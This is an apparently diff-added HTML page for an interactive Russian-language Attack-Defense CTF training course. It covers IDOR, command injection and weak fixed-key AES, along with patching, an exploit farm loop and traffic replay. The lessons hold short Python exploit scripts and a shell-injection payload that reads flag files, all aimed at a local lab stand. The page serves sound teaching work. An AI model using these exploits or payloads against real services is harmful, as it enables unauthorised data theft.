@@ -1,0 +1,657 @@
+<title>A/D Тренажёр</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+/* Layout: фиксированный левый оглавитель + колонка чтения ~820px. Один тёмный мир (чёрно-серый). */
+:root{
+  --bg:#0a0b0d; --bg2:#101216; --bg3:#161920; --raise:#1b1f27;
+  --line:#242934; --line2:#2d333f;
+  --tx:#e7e9ee; --mut:#9aa4b2; --dim:#616b7a; --faint:#3a414d;
+  --acc:#6ee7a8; --accd:#2c6b4a; --accbg:#0f1a14;
+  --red:#f0637a; --redbg:#1b0f13; --warn:#e8b765; --blue:#6cb6ff;
+  --f-head:"Space Grotesk",system-ui,sans-serif;
+  --f-body:"Inter",system-ui,-apple-system,sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,Consolas,monospace;
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--tx);font-family:var(--f-body);font-size:16px;line-height:1.65;margin:0;-webkit-font-smoothing:antialiased}
+a{color:var(--acc);text-decoration:none}
+code,kbd,.mono{font-family:var(--f-mono)}
+h1,h2,h3,h4{font-family:var(--f-head);font-weight:600;line-height:1.2;text-wrap:balance;margin:0}
+::selection{background:var(--accd);color:#eafff3}
+
+/* topbar */
+.top{position:sticky;top:env(safe-area-inset-top,0px);z-index:40;display:flex;align-items:center;gap:14px;
+  height:56px;background:rgba(10,11,13,.86);backdrop-filter:blur(8px);border-bottom:1px solid var(--line);
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px))}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:var(--bg);z-index:50}
+.brand{font-family:var(--f-mono);font-weight:700;letter-spacing:-.02em;font-size:15px;color:var(--tx);white-space:nowrap}
+.brand b{color:var(--acc)}
+.top .prog{flex:1;min-width:0;display:flex;align-items:center;gap:10px}
+.top .bar{flex:1;height:4px;background:var(--bg3);border-radius:4px;overflow:hidden;max-width:360px}
+.top .bar>i{display:block;height:100%;width:0;background:var(--acc);transition:width .4s}
+.top .pct{font-family:var(--f-mono);font-size:12px;color:var(--mut);min-width:34px}
+.menu-btn{display:none;background:var(--bg3);border:1px solid var(--line);color:var(--tx);border-radius:8px;
+  width:38px;height:38px;font-size:18px;cursor:pointer}
+
+.app{display:flex;align-items:flex-start}
+/* sidebar */
+aside{position:sticky;top:56px;align-self:flex-start;flex:0 0 288px;width:288px;height:calc(100vh - 56px);
+  overflow:auto;border-right:1px solid var(--line);padding:18px 12px 60px}
+aside .grp{font-family:var(--f-mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);
+  padding:14px 12px 6px}
+aside a.nav{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:9px;color:var(--mut);
+  font-size:14.5px;line-height:1.3}
+aside a.nav:hover{background:var(--bg2);color:var(--tx)}
+aside a.nav.on{background:var(--bg3);color:var(--tx)}
+aside a.nav .ix{font-family:var(--f-mono);font-size:12px;color:var(--dim);min-width:20px}
+aside a.nav.done .ix{color:var(--acc)}
+aside a.nav .ck{margin-left:auto;color:var(--acc);opacity:0;font-size:13px}
+aside a.nav.done .ck{opacity:1}
+
+main{flex:1;min-width:0}
+.content{max-width:840px;margin:0 auto;
+  padding-left:max(20px,env(safe-area-inset-left,0px));padding-right:max(20px,env(safe-area-inset-right,0px));
+  padding-block:0 100px}
+section.lesson{padding-top:46px;scroll-margin-top:72px}
+.eyebrow{font-family:var(--f-mono);font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--acc);margin-bottom:10px}
+h2.t{font-size:30px;letter-spacing:-.02em;margin-bottom:6px}
+h3.s{font-size:20px;margin:30px 0 8px}
+h4.q{font-size:15px;font-family:var(--f-mono);color:var(--mut);margin:22px 0 8px;text-transform:uppercase;letter-spacing:.06em}
+p{margin:12px 0;color:#d4d8df}
+.lead{color:var(--mut);font-size:17px}
+ul,ol{margin:12px 0;padding-left:22px}li{margin:6px 0;color:#d4d8df}
+hr{border:0;border-top:1px solid var(--line);margin:40px 0}
+strong{color:var(--tx)}
+
+/* hero */
+.hero{padding-top:54px}
+.hero h1{font-size:clamp(34px,7vw,56px);letter-spacing:-.03em}
+.hero h1 .g{color:var(--acc)}
+.hero .sub{color:var(--mut);font-size:19px;max-width:620px;margin-top:14px}
+.hero .cta{display:flex;flex-wrap:wrap;gap:12px;margin-top:26px}
+.btn{font-family:var(--f-body);font-weight:600;font-size:15px;border-radius:10px;padding:11px 18px;cursor:pointer;
+  border:1px solid var(--line);background:var(--bg3);color:var(--tx)}
+.btn:hover{border-color:var(--faint);background:var(--raise)}
+.btn.p{background:var(--acc);color:#07140c;border-color:var(--acc)}
+.btn.p:hover{filter:brightness(1.08)}
+.btn.sm{padding:7px 13px;font-size:13.5px}
+.stat-row{display:flex;flex-wrap:wrap;gap:10px;margin-top:34px}
+.stat{border:1px solid var(--line);border-radius:12px;padding:14px 16px;min-width:140px;background:var(--bg2)}
+.stat b{font-family:var(--f-mono);font-size:22px;color:var(--tx);display:block}
+.stat span{font-size:12.5px;color:var(--dim)}
+
+/* panels / cards */
+.panel{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:18px 20px;margin:18px 0}
+.callout{border-left:3px solid var(--acc);background:var(--accbg);border-radius:0 10px 10px 0;padding:12px 16px;margin:16px 0}
+.callout.red{border-color:var(--red);background:var(--redbg)}
+.callout.warn{border-color:var(--warn);background:#17120a}
+.callout .h{font-weight:600;color:var(--tx);margin-bottom:2px}
+.grid2{display:grid;gap:14px}
+@media(min-width:640px){.grid2{grid-template-columns:1fr 1fr}}
+.tag{display:inline-block;font-family:var(--f-mono);font-size:11px;padding:3px 9px;border-radius:999px;border:1px solid var(--line);color:var(--mut);vertical-align:middle}
+.tag.red{color:var(--red);border-color:#50222e}.tag.grn{color:var(--acc);border-color:var(--accd)}.tag.warn{color:var(--warn);border-color:#4d3c1a}
+
+/* glossary */
+.gloss{display:grid;gap:10px}
+.gloss .row{display:grid;grid-template-columns:150px 1fr;gap:14px;padding:12px 0;border-bottom:1px solid var(--line)}
+.gloss .k{font-family:var(--f-mono);color:var(--acc);font-size:14px}
+@media(max-width:560px){.gloss .row{grid-template-columns:1fr;gap:3px}}
+
+/* code + terminal */
+pre{background:#07080a;border:1px solid var(--line);border-radius:10px;padding:14px 16px;overflow:auto;margin:14px 0;font-size:13.5px;line-height:1.6}
+pre code{color:#cdd6e4}
+.code-ed{background:#07080a;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:14px 0}
+.code-ed .hd{display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--line);background:var(--bg2);font-family:var(--f-mono);font-size:12px;color:var(--dim)}
+.code-ed .hd .dot{width:9px;height:9px;border-radius:50%}
+.code-ed textarea{width:100%;min-height:150px;background:transparent;border:0;color:#d7e0ee;font-family:var(--f-mono);font-size:13.5px;line-height:1.6;padding:12px 14px;resize:vertical;outline:none;tab-size:4}
+.ed-bar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding:10px 12px;border-top:1px solid var(--line);background:var(--bg2)}
+.ed-bar .msg{font-family:var(--f-mono);font-size:12.5px;margin-left:auto}
+.ok{color:var(--acc)}.bad{color:var(--red)}
+
+/* interactive sim */
+.sim{border:1px solid var(--line);border-radius:12px;background:var(--bg2);margin:16px 0;overflow:hidden}
+.sim .bar{display:flex;align-items:center;gap:8px;padding:9px 12px;background:var(--bg3);border-bottom:1px solid var(--line);font-family:var(--f-mono);font-size:12px;color:var(--dim)}
+.sim .bar .d{display:flex;gap:6px}.sim .bar .d i{width:10px;height:10px;border-radius:50%;background:var(--faint)}
+.sim .body{padding:16px}
+.urlbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.urlbar .pre{font-family:var(--f-mono);font-size:13px;color:var(--mut);white-space:nowrap}
+.inp{font-family:var(--f-mono);font-size:14px;background:#07080a;border:1px solid var(--line);color:var(--tx);border-radius:8px;padding:9px 11px;outline:none}
+.inp:focus{border-color:var(--accd)}
+.out{font-family:var(--f-mono);font-size:13px;white-space:pre-wrap;word-break:break-word;background:#07080a;border:1px solid var(--line);border-radius:8px;padding:12px;margin-top:12px;min-height:20px;color:#cdd6e4}
+.out .flag{color:var(--acc);font-weight:700}
+.out .err{color:var(--red)}
+.out .dim{color:var(--dim)}
+.scoreline{font-family:var(--f-mono);font-size:13px;color:var(--mut);margin-top:10px}
+.scoreline b{color:var(--acc)}
+
+/* homework */
+.hw{margin:14px 0;display:grid;gap:8px}
+.hw label{display:flex;gap:11px;align-items:flex-start;padding:12px 14px;border:1px solid var(--line);border-radius:10px;background:var(--bg2);cursor:pointer}
+.hw label:hover{border-color:var(--faint)}
+.hw input{margin-top:3px;width:17px;height:17px;accent-color:var(--acc);flex:0 0 auto}
+.hw .d{color:#d4d8df;font-size:14.5px}
+.hw input:checked ~ .d{color:var(--dim);text-decoration:line-through}
+
+.done-row{display:flex;flex-wrap:wrap;gap:12px;align-items:center;margin-top:26px;padding-top:20px;border-top:1px solid var(--line)}
+.done-row .lbl{color:var(--dim);font-size:13.5px}
+.btn.mark.is-done{background:var(--accbg);color:var(--acc);border-color:var(--accd)}
+
+footer{border-top:1px solid var(--line);color:var(--dim);font-size:13px;padding:26px 0 40px;margin-top:50px}
+
+.scrim{display:none}
+@media(max-width:860px){
+  .menu-btn{display:block}
+  aside{position:fixed;top:56px;left:0;z-index:45;background:var(--bg);transform:translateX(-100%);transition:transform .22s;box-shadow:0 20px 60px #000a}
+  aside.open{transform:none}
+  .scrim.show{display:block;position:fixed;inset:56px 0 0;background:#000a;z-index:44}
+}
+</style>
+
+<div class="top">
+  <button class="menu-btn" id="menuBtn" aria-label="Оглавление">☰</button>
+  <div class="brand">A/D<b>_</b>Тренажёр</div>
+  <div class="prog">
+    <div class="bar"><i id="pbar"></i></div>
+    <div class="pct" id="ppct">0%</div>
+  </div>
+</div>
+
+<div class="app">
+  <aside id="side"></aside>
+  <div class="scrim" id="scrim"></div>
+  <main>
+    <div class="content">
+
+      <!-- HERO -->
+      <header class="hero" id="top">
+        <div class="eyebrow">курс с нуля · Attack-Defense</div>
+        <h1>От нуля до <span class="g">боя</span>.</h1>
+        <p class="sub">Вы умеете решать таски, но никогда не играли Attack-Defense. Этот тренажёр ведёт за руку: что такое дыра, как написать эксплойт, что такое ферма и сабмиттер, как защищаться — с интерактивом прямо в странице и домашкой на вашем стенде.</p>
+        <div class="cta">
+          <button class="btn p" onclick="go('l0')">Начать с азов →</button>
+          <button class="btn" onclick="go('l1')">Сразу к первой дыре</button>
+        </div>
+        <div class="stat-row">
+          <div class="stat"><b>3</b><span>класса уязвимостей</span></div>
+          <div class="stat"><b>5</b><span>интерактивных уроков</span></div>
+          <div class="stat"><b>∞</b><span>попыток — не страшно сломать</span></div>
+        </div>
+      </header>
+
+      <!-- L0 -->
+      <section class="lesson" id="l0" data-title="Что такое A/D" data-grp="Основы">
+        <div class="eyebrow">урок 0</div>
+        <h2 class="t">Что такое Attack-Defense</h2>
+        <p class="lead">Коротко и с нуля: чем это отличается от тасков, которые вы решали.</p>
+        <p>В обычном CTF (Task-Based) есть задача — вы её решаете, сдаёте флаг, всё. В <strong>Attack-Defense</strong> всё одновременно: у каждой команды работает <strong>одинаковый набор сервисов</strong> (маленьких программ-сайтов), и игра идёт <strong>раундами</strong>.</p>
+        <div class="grid2">
+          <div class="panel"><h4 class="q">🗡 Атака</h4>Ты находишь дыру в сервисе <em>соперника</em>, достаёшь из него секрет (флаг) и сдаёшь его — за это очки.</div>
+          <div class="panel"><h4 class="q">🛡 Защита</h4>Та же дыра есть и у <em>тебя</em>. Надо её закрыть (запатчить), но так, чтобы сервис продолжал работать.</div>
+        </div>
+        <div class="callout"><div class="h">Главная мысль</div>Нельзя просто выключить сервис, чтобы не украли. Если он не работает — штраф (это называется <strong>SLA</strong>). Задача: закрыть дыру и оставить сервис живым.</div>
+        <p>Весь остальной курс — это по сути два навыка, доведённые до автоматизма: <strong>быстро находить и забирать чужие флаги</strong> и <strong>быстро чинить свои дыры</strong>. Плюс автоматизация, чтобы не делать это руками.</p>
+        <div class="done-row"><button class="btn mark" data-mark="l0">Отметить пройденным ✓</button><span class="lbl">листай дальше — дальше словарь новичка</span></div>
+      </section>
+
+      <!-- L-gloss -->
+      <section class="lesson" id="lg" data-title="Словарь новичка" data-grp="Основы">
+        <div class="eyebrow">словарь</div>
+        <h2 class="t">Слова, которые все кидают</h2>
+        <p class="lead">Ферма, сплойт, чекер, тик… Разберём, чтобы ты не кивал молча.</p>
+        <div class="gloss">
+          <div class="row"><div class="k">флаг</div><div>Строка-секрет, которую надо украсть. У нас выглядит так: <code>2GSEP3JOB2SFRG2XRG0DH11878YL11C=</code></div></div>
+          <div class="row"><div class="k">сервис</div><div>Маленькая программа-сайт с дырой. Их несколько, у каждой команды свои.</div></div>
+          <div class="row"><div class="k">эксплойт / сплойт</div><div>Скрипт, который использует дыру и достаёт флаг. «Написать сплойт» = написать такой скрипт (обычно на Python).</div></div>
+          <div class="row"><div class="k">чекер</div><div>Судья. Каждый раунд кладёт свежие флаги в сервисы и проверяет, что они живые (это и есть SLA).</div></div>
+          <div class="row"><div class="k">раунд / тик</div><div>Один цикл игры (напр. 60 сек). Каждый тик — новые флаги. Старые «протухают».</div></div>
+          <div class="row"><div class="k">SLA</div><div>Оценка «жив ли твой сервис». Сломал при патче — теряешь очки, даже если тебя не взломали.</div></div>
+          <div class="row"><div class="k">сабмиттер</div><div>Точка, куда сдают украденные флаги, чтобы получить очки.</div></div>
+          <div class="row"><div class="k">ферма</div><div>Скрипт, который сам гоняет твои сплойты по ВСЕМ соперникам каждый тик и сам сдаёт флаги. Без неё не успеть руками.</div></div>
+          <div class="row"><div class="k">replay / кража трафика</div><div>Соперник атакует тебя → его запрос виден в твоём трафике → ты повторяешь его по всем. Чужой труд = твои очки.</div></div>
+          <div class="row"><div class="k">вулнбокс</div><div>Твоя машина с сервисами, которую ты защищаешь.</div></div>
+        </div>
+        <div class="done-row"><button class="btn mark" data-mark="lg">Отметить пройденным ✓</button><span class="lbl">теперь — первая настоящая дыра</span></div>
+      </section>
+
+      <!-- L1 IDOR -->
+      <section class="lesson" id="l1" data-title="Дыра №1: IDOR" data-grp="Уязвимости">
+        <div class="eyebrow">урок 1 · <span class="tag red">IDOR</span></div>
+        <h2 class="t">Дыра №1 — «дай чужое по номеру»</h2>
+        <p class="lead">Сервис <code>notes</code> хранит заметки. Флаг лежит в чужой приватной заметке. Задача — прочитать её без пароля.</p>
+
+        <h3 class="s">Шаг 1. Пощупай дыру руками</h3>
+        <p>Сервис отдаёт заметку по её номеру — <code>GET /note/1</code> — и <strong>не проверяет, твоя ли она</strong>. Это называется <strong>IDOR</strong> (небезопасная ссылка на объект). Меняй номер и смотри. Пароль мы не вводим.</p>
+        <div class="sim" id="sim1">
+          <div class="bar"><div class="d"><i></i><i></i><i></i></div> notes · team2 (чужой)</div>
+          <div class="body">
+            <div class="urlbar">
+              <span class="pre">GET http://team2/note/</span>
+              <input class="inp" id="s1id" style="width:84px" value="1" inputmode="numeric">
+              <button class="btn sm p" onclick="s1get()">Запросить</button>
+              <button class="btn sm" onclick="s1all()">Перебрать 1…6</button>
+            </div>
+            <div class="out" id="s1out">нажми «Запросить»…</div>
+          </div>
+        </div>
+        <div class="callout"><div class="h">Увидел?</div>По номерам 1, 3, 5 вылезают чужие флаги. Ты только что совершил атаку — руками. Теперь автоматизируем.</div>
+
+        <h3 class="s">Шаг 2. Напиши эксплойт</h3>
+        <p>Эксплойт — это тот же перебор, но кодом. Ниже почти готовый скрипт на Python. Впиши <strong>диапазон перебора</strong> вместо <code>???</code> (попробуй <code>range(1, 200)</code>) и нажми «Проверить».</p>
+        <div class="code-ed">
+          <div class="hd"><span class="dot" style="background:#f0637a"></span><span class="dot" style="background:#e8b765"></span><span class="dot" style="background:#6ee7a8"></span> notes_sploit.py</div>
+          <textarea id="ed1" spellcheck="false">import requests, re
+FLAG = re.compile(r"[A-Z0-9]{31}=")
+
+def exploit(host):
+    flags = []
+    for i in ???:                       # &lt;- впиши диапазон перебора
+        r = requests.get(f"http://{host}/note/{i}")
+        if r.status_code == 200:
+            flags += FLAG.findall(r.json()["body"])
+    return flags</textarea>
+          <div class="ed-bar">
+            <button class="btn sm p" onclick="check1()">Проверить</button>
+            <button class="btn sm" onclick="run1()" id="run1b" disabled>▶ Запустить</button>
+            <span class="msg" id="msg1"></span>
+          </div>
+        </div>
+        <div class="out" id="r1out" hidden></div>
+
+        <h3 class="s">Шаг 3. Запатчи у себя</h3>
+        <p>Теперь ты — защита. Дыра в том, что <code>/note/&lt;id&gt;</code> не проверяет владельца. Нажми, чтобы применить патч (добавить проверку «а заметка его?»), и снова попробуй перебор — чужое больше не отдаётся, а своё и SLA работают.</p>
+        <pre id="patch1"><code>@app.get("/note/&lt;int:nid&gt;")
+def get_note(nid):
+    n = NOTES.get(nid)
+    if not n: return error(404)
+    <span style="color:var(--red)"># дыры: любой может прочитать любую заметку</span>
+    return jsonify(body=n["body"])</code></pre>
+        <div class="urlbar">
+          <button class="btn sm p" id="patch1btn" onclick="patch1()">Применить патч (проверка владельца)</button>
+          <button class="btn sm" onclick="s1all()">Проверить перебором ещё раз</button>
+        </div>
+        <div class="done-row"><button class="btn mark" data-mark="l1">Отметить пройденным ✓</button><span class="lbl">ниже — домашка на реальном стенде</span></div>
+
+        <h4 class="q">🎒 Домашнее задание</h4>
+        <div class="hw" data-hw="l1">
+          <label><input type="checkbox"><span class="d">Подними стенд (<code>scripts\up.ps1</code>), открой в браузере <code>http://localhost:5200/note/1</code> — увидь флаг своими глазами.</span></label>
+          <label><input type="checkbox"><span class="d">Положи <code>notes_sploit.py</code> в <code>farm/sploits/</code> и запусти <code>python farm.py --once</code> — добейся строки <code>ACCEPTED</code>.</span></label>
+          <label><input type="checkbox"><span class="d">Запатчи <code>services/notes/app.py</code> (проверка владельца), пересобери, убедись: <code>attacker_bot</code> больше не крадёт твой флаг, а SLA = 100%.</span></label>
+        </div>
+      </section>
+
+      <!-- L2 cmd injection -->
+      <section class="lesson" id="l2" data-title="Дыра №2: инъекция команд" data-grp="Уязвимости">
+        <div class="eyebrow">урок 2 · <span class="tag red">command injection</span></div>
+        <h2 class="t">Дыра №2 — сервис запускает твой текст как команду</h2>
+        <p class="lead">Сервис <code>pingtool</code> пингует хост, который ты ввёл. Но он склеивает команду строкой — и ты можешь дописать свою.</p>
+
+        <h3 class="s">Шаг 1. Пощупай</h3>
+        <p>Введи обычный хост — получишь пинг. Теперь допиши <code>; cat /data/*/*</code> — точка с запятой завершает ping и запускает твою команду, которая читает файлы с флагами.</p>
+        <div class="sim" id="sim2">
+          <div class="bar"><div class="d"><i></i><i></i><i></i></div> pingtool · team2</div>
+          <div class="body">
+            <div class="urlbar">
+              <span class="pre">POST /diag  host =</span>
+              <input class="inp" id="s2host" style="min-width:230px;flex:1" value="127.0.0.1">
+              <button class="btn sm p" onclick="s2run()">Выполнить</button>
+            </div>
+            <div class="urlbar" style="margin-top:8px">
+              <button class="btn sm" onclick="s2fill('127.0.0.1')">обычный хост</button>
+              <button class="btn sm" onclick="s2fill('127.0.0.1; cat /data/*/*')">вставить инъекцию →</button>
+            </div>
+            <div class="out" id="s2out">вывод команды…</div>
+          </div>
+        </div>
+
+        <h3 class="s">Шаг 2. Эксплойт</h3>
+        <p>Один запрос с инъекцией достаёт все флаги сразу. Впиши <strong>полезную нагрузку</strong> вместо <code>???</code> (строку <code>"127.0.0.1; cat /data/*/*"</code>).</p>
+        <div class="code-ed">
+          <div class="hd"><span class="dot" style="background:#f0637a"></span><span class="dot" style="background:#e8b765"></span><span class="dot" style="background:#6ee7a8"></span> pingtool_sploit.py</div>
+          <textarea id="ed2" spellcheck="false">import requests, re
+FLAG = re.compile(r"[A-Z0-9]{31}=")
+
+def exploit(host):
+    payload = ???                       # &lt;- впиши строку с инъекцией
+    r = requests.post(f"http://{host}/diag", json={"host": payload})
+    return FLAG.findall(r.json()["stdout"])</textarea>
+          <div class="ed-bar">
+            <button class="btn sm p" onclick="check2()">Проверить</button>
+            <button class="btn sm" onclick="run2()" id="run2b" disabled>▶ Запустить</button>
+            <span class="msg" id="msg2"></span>
+          </div>
+        </div>
+        <div class="out" id="r2out" hidden></div>
+
+        <h3 class="s">Шаг 3. Патч</h3>
+        <p>Чинится так: не запускать через оболочку (shell), а передать аргументы списком и проверить хост. Применяй и проверяй — инъекция мертва, обычный ping жив.</p>
+        <pre><code>out = subprocess.run(<span style="color:var(--acc)">["ping","-c","1", host]</span>,  # список, без shell=True
+                     capture_output=True, text=True)</code></pre>
+        <div class="urlbar">
+          <button class="btn sm p" id="patch2btn" onclick="patch2()">Применить патч (убрать shell)</button>
+          <button class="btn sm" onclick="s2run()">Проверить ещё раз</button>
+        </div>
+        <div class="done-row"><button class="btn mark" data-mark="l2">Отметить пройденным ✓</button></div>
+        <h4 class="q">🎒 Домашнее задание</h4>
+        <div class="hw" data-hw="l2">
+          <label><input type="checkbox"><span class="d">На стенде достань флаги из <code>pingtool_team2</code> своим сплойтом, добейся <code>ACCEPTED</code>.</span></label>
+          <label><input type="checkbox"><span class="d">Запатчи <code>services/pingtool/app.py</code> (убери <code>shell=True</code>), проверь что ping ещё работает и флаги не утекают.</span></label>
+        </div>
+      </section>
+
+      <!-- L3 crypto -->
+      <section class="lesson" id="l3" data-title="Дыра №3: слабая крипта" data-grp="Уязвимости">
+        <div class="eyebrow">урок 3 · <span class="tag red">weak crypto</span> <span class="tag warn">ваша тема</span></div>
+        <h2 class="t">Дыра №3 — шифр есть, толку нет</h2>
+        <p class="lead">Сервис <code>vault</code> шифрует секреты. Но: шифротекст отдаётся <em>без пароля</em>, а ключ одинаковый у всех и лежит в исходниках. Значит, расшифруешь сам.</p>
+        <h3 class="s">Шаг 1. Пощупай</h3>
+        <p>Эндпоинт <code>/blob/&lt;id&gt;</code> отдаёт зашифрованный секрет кому угодно. Ключ <code>dojo-fixed-key!!</code> известен (он в коде сервиса). Забери шифротекст и расшифруй.</p>
+        <div class="sim" id="sim3">
+          <div class="bar"><div class="d"><i></i><i></i><i></i></div> vault · team2</div>
+          <div class="body">
+            <div class="urlbar">
+              <span class="pre">GET /blob/</span>
+              <input class="inp" id="s3id" style="width:84px" value="1" inputmode="numeric">
+              <button class="btn sm p" onclick="s3get()">Забрать шифротекст</button>
+              <button class="btn sm" id="s3dec" onclick="s3decrypt()" disabled>🔓 Расшифровать ключом</button>
+            </div>
+            <div class="out" id="s3out">…</div>
+          </div>
+        </div>
+        <h3 class="s">Шаг 2. Эксплойт</h3>
+        <p>Перебираем id, качаем blob, расшифровываем известным ключом. Впиши диапазон <code>range(1, 200)</code>.</p>
+        <div class="code-ed">
+          <div class="hd"><span class="dot" style="background:#f0637a"></span><span class="dot" style="background:#e8b765"></span><span class="dot" style="background:#6ee7a8"></span> vault_sploit.py</div>
+          <textarea id="ed3" spellcheck="false">import requests, re
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+KEY = b"dojo-fixed-key!!"              # известен из исходников сервиса
+FLAG = re.compile(r"[A-Z0-9]{31}=")
+
+def exploit(host):
+    flags = []
+    for i in ???:                       # &lt;- впиши диапазон
+        r = requests.get(f"http://{host}/blob/{i}")
+        if r.status_code != 200: continue
+        ct = bytes.fromhex(r.json()["ciphertext"])
+        pt = unpad(AES.new(KEY, AES.MODE_ECB).decrypt(ct), 16)
+        flags += FLAG.findall(pt.decode(errors="ignore"))
+    return flags</textarea>
+          <div class="ed-bar">
+            <button class="btn sm p" onclick="check3()">Проверить</button>
+            <button class="btn sm" onclick="run3()" id="run3b" disabled>▶ Запустить</button>
+            <span class="msg" id="msg3"></span>
+          </div>
+        </div>
+        <div class="out" id="r3out" hidden></div>
+        <h3 class="s">Шаг 3. Патч</h3>
+        <p>Закрыть <code>/blob</code> авторизацией (или убрать его) — и/или генерировать случайный ключ при старте. Применяй:</p>
+        <div class="urlbar">
+          <button class="btn sm p" id="patch3btn" onclick="patch3()">Применить патч (закрыть /blob)</button>
+          <button class="btn sm" onclick="s3get()">Проверить ещё раз</button>
+        </div>
+        <div class="done-row"><button class="btn mark" data-mark="l3">Отметить пройденным ✓</button></div>
+        <h4 class="q">🎒 Домашнее задание</h4>
+        <div class="hw" data-hw="l3">
+          <label><input type="checkbox"><span class="d">Достань секреты из <code>vault_team2</code>, сдай флаги.</span></label>
+          <label><input type="checkbox"><span class="d">Запатчи <code>services/vault/app.py</code> двумя способами и проверь, что <code>seal→reveal</code> (SLA) живёт.</span></label>
+        </div>
+      </section>
+
+      <!-- L4 farm -->
+      <section class="lesson" id="l4" data-title="Автоматизация: ферма" data-grp="Боевые навыки">
+        <div class="eyebrow">урок 4 · скрипты</div>
+        <h2 class="t">Ферма — делает всё за тебя</h2>
+        <p class="lead">Руками сдавать флаги = проиграть. Ферма берёт твои сплойты и каждый тик бьёт ими по всем соперникам, собирает флаги и сдаёт их. Это и есть «автоматизация», которой вы боялись.</p>
+        <p>Ферма — это просто цикл. Разбери построчно:</p>
+        <pre><code>sploits = load_sploits()           <span class="dim"># все твои *_sploit.py</span>
+while True:                         <span class="dim"># каждый тик</span>
+    flags = set()
+    for team in teams:             <span class="dim"># по каждому сопернику</span>
+        for svc, exploit in sploits:
+            flags |= set(exploit(team))   <span class="dim"># запускаем сплойт</span>
+    submit(flags)                  <span class="dim"># сдаём пачкой в сабмиттер</span>
+    sleep(tick)</code></pre>
+        <p>Нажми — ферма прогонит твои 3 сплойта по 3 соперникам (симуляция):</p>
+        <div class="sim">
+          <div class="bar"><div class="d"><i></i><i></i><i></i></div> farm.py</div>
+          <div class="body">
+            <button class="btn sm p" onclick="runFarm()">▶ Запустить ферму (3 тика)</button>
+            <div class="out" id="farmout" style="max-height:240px;overflow:auto">готова к запуску…</div>
+            <div class="scoreline">очки атаки: <b id="farmscore">0</b></div>
+          </div>
+        </div>
+        <div class="callout"><div class="h">Вывод</div>Один человек в команде отвечает за ферму. Пока остальные ищут новые дыры — ферма доит старые 24/7.</div>
+        <div class="done-row"><button class="btn mark" data-mark="l4">Отметить пройденным ✓</button></div>
+        <h4 class="q">🎒 Домашнее задание</h4>
+        <div class="hw" data-hw="l4">
+          <label><input type="checkbox"><span class="d">Собери все 3 сплойта в <code>farm/sploits/</code>, запусти <code>python farm.py</code> в цикле, смотри как растёт «АТАКА» на табло <code>localhost:8080</code>.</span></label>
+          <label><input type="checkbox"><span class="d">Открой <code>farm/farm.py</code> и прочитай его — убедись, что понимаешь каждую строчку (это твой боевой инструмент).</span></label>
+        </div>
+      </section>
+
+      <!-- L5 traffic -->
+      <section class="lesson" id="l5" data-title="Кража трафика (replay)" data-grp="Боевые навыки">
+        <div class="eyebrow">урок 5 · replay</div>
+        <h2 class="t">Кража чужих эксплойтов из трафика</h2>
+        <p class="lead">Самый «читерский» навык: не ищи дыру сам — укради атаку соперника из своего трафика и повтори её по всем. Половина очков топ-команд — отсюда.</p>
+        <p>Ты пишешь весь трафик к своим сервисам (tcpdump). Среди обычных запросов попадаются чужие атаки. Найди подозрительный и «переиграй» его.</p>
+        <div class="sim">
+          <div class="bar"><div class="d"><i></i><i></i><i></i></div> перехваченный трафик (team1)</div>
+          <div class="body">
+            <div id="pcap"></div>
+            <div class="out" id="pcapout" hidden></div>
+          </div>
+        </div>
+        <div class="done-row"><button class="btn mark" data-mark="l5">Отметить пройденным ✓</button></div>
+        <h4 class="q">🎒 Домашнее задание</h4>
+        <div class="hw" data-hw="l5">
+          <label><input type="checkbox"><span class="d">На стенде включи запись: <code>docker compose logs -f</code> или tcpdump, дай <code>attacker_bot</code> поатаковать тебя, найди его запросы.</span></label>
+          <label><input type="checkbox"><span class="d">Повтори найденный запрос по <code>team2/team3</code> вручную (curl/requests) — это и есть replay.</span></label>
+        </div>
+      </section>
+
+      <!-- L6 roles/plan -->
+      <section class="lesson" id="l6" data-title="Роли и план на 3 дня" data-grp="На финал">
+        <div class="eyebrow">сборка команды</div>
+        <h2 class="t">Роли и план на 3 дня</h2>
+        <p class="lead">Вас пятеро. В A/D выигрывает конвейер, а не «все ищут баги».</p>
+        <div class="grid2">
+          <div class="panel"><h4 class="q">1 · Капитан</h4>Приоритеты: что атакуем, что патчим первым. Смотрит табло и время.</div>
+          <div class="panel"><h4 class="q">2 · Exploit-dev</h4>Находит дыры, пишет сплойты. Главный по «первой крови».</div>
+          <div class="panel"><h4 class="q">3 · Патчер</h4>Чинит дыры, держит SLA зелёным, быстро передеплоит.</div>
+          <div class="panel"><h4 class="q">4 · Трафик</h4>tcpdump, ворует чужие атаки (replay).</div>
+          <div class="panel"><h4 class="q">5 · Ферма/инфра</h4>Ферма, сабмиттер, мониторинг — чтобы руки остальных не тратились на рутину.</div>
+          <div class="panel"><h4 class="q">План</h4>Пн — основы + 3 дыры. Вт — ферма + трафик + патч под давлением. Ср — внутренний матч, по цифрам раздать роли.</div>
+        </div>
+        <div class="done-row"><button class="btn mark" data-mark="l6">Отметить пройденным ✓</button></div>
+      </section>
+
+      <footer>
+        A/D Тренажёр · интерактив симулирует сервисы в браузере · домашку делаешь на реальном стенде (папка проекта).<br>
+        Прогресс сохраняется в этом браузере. Сломать ничего нельзя — тыкай смело.
+      </footer>
+
+    </div>
+  </main>
+</div>
+
+<script>
+"use strict";
